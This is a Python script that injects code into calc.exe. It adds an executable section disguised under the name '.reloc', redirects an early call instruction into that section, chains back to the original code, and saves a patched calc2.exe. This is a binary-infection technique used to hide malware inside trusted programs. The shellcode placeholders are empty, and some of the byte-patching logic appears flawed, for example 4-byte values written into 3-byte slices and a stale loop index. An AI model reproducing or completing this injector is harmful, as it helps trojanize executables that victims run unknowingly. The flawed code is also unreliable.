from operator import index
import pefile
import binascii


def adjust_SectionSize(sz, align):
    if sz % align:
        sz = ((sz + align) // align) * align
    return sz


pe = pefile.PE('calc.exe')
last_section = pe.sections[-1]

new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)

# fill with zeros
new_section.__unpack__(bytearray(new_section.sizeof()))

# place section header after last section header (assume there is enough room)
new_section.set_file_offset(
    last_section.get_file_offset() + last_section.sizeof())

new_section.Name = b'.reloc'
new_section_size = 3000

new_section.SizeOfRawData = adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
new_section.PointerToRawData = len(pe.__data__)

new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
new_section.VirtualAddress = last_section.VirtualAddress + \
    adjust_SectionSize(last_section.Misc_VirtualSize,
                       pe.OPTIONAL_HEADER.SectionAlignment)

new_section.Characteristics = 0x40000000 | 0x20000000 | 0x20  # read | execute | code
# create new section data containing jump to OEP
# 4DC645E9
shellCode_part_one = binascii.unhexlify("")

shellCode_part_two = binascii.unhexlify("")

endFile = new_section.VirtualAddress + \
    len(shellCode_part_one) + len(shellCode_part_two)+1

shellCode_jmp_oldEntryPoint = bytearray(4)
shellCode_jmp_oldEntryPoint[0] = 0xe9
shellCode_jmp_oldEntryPoint[1:4] = (endFile -
                                    (new_section.VirtualAddress + 5+int(len(shellCode_part_one)))).to_bytes(4,
                                                                                                            byteorder='little', signed=True)


# change address of entry point to beginning of new section
peHex = pe.get_memory_mapped_image()
indexInsert = 0
for i in range(0, len(peHex)):
    if peHex[i] == 232:
        if (i > pe.OPTIONAL_HEADER.AddressOfEntryPoint):
            indexInsert = i
            break

# increase size of image
pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(
    new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)

callJump = new_section.VirtualAddress - 5 - indexInsert

# INSERT CODE
oldAdress = peHex[i+1:i+5]
_oldAdress = int.from_bytes(oldAdress, byteorder='little')
shellCode_part_three = bytearray(new_section.SizeOfRawData -
                                 len(shellCode_part_one)-len(shellCode_part_two)-5)
# E8552effffe9912cffff
# 552EFFFF
absoluteAddress = indexInsert + _oldAdress
__aaa = absoluteAddress - \
    (new_section.VirtualAddress+5 + len(shellCode_part_one) +
     len(shellCode_part_two))
print(hex(4294967296 + __aaa))
__return = (indexInsert) - \
    (new_section.VirtualAddress+10 + len(shellCode_part_one) +
     len(shellCode_part_two))
print(hex(4294967296+__return))
shellCode_part_three[0] = 0xe8
shellCode_part_three[1:4] = __aaa.to_bytes(4,
                                           byteorder='little', signed=True)
shellCode_part_three[5] = 0xe9
shellCode_part_three[6:9] = __return.to_bytes(4,
                                              byteorder='little', signed=True)
# Clone File
_offset = pe.get_offset_from_rva(indexInsert)
clonePeFile = bytearray(pe.__data__)

clonePeFile[_offset+1:_offset +
            5] = callJump.to_bytes(4, byteorder='little', signed=True)

pe.FILE_HEADER.NumberOfSections += 1

# append new section to structures
pe.sections.append(new_section)
pe.__structures__.append(new_section)


if indexInsert != 0:
    pe.__data__ = clonePeFile+shellCode_part_one + \
        shellCode_jmp_oldEntryPoint+shellCode_part_two + \
        shellCode_part_three
else:
    pe.__data__ = bytearray(
        pe.__data__) + shellCode_jmp_oldEntryPoint+shellCode_part_two + shellCode_part_three
pe.write('calc2.exe')
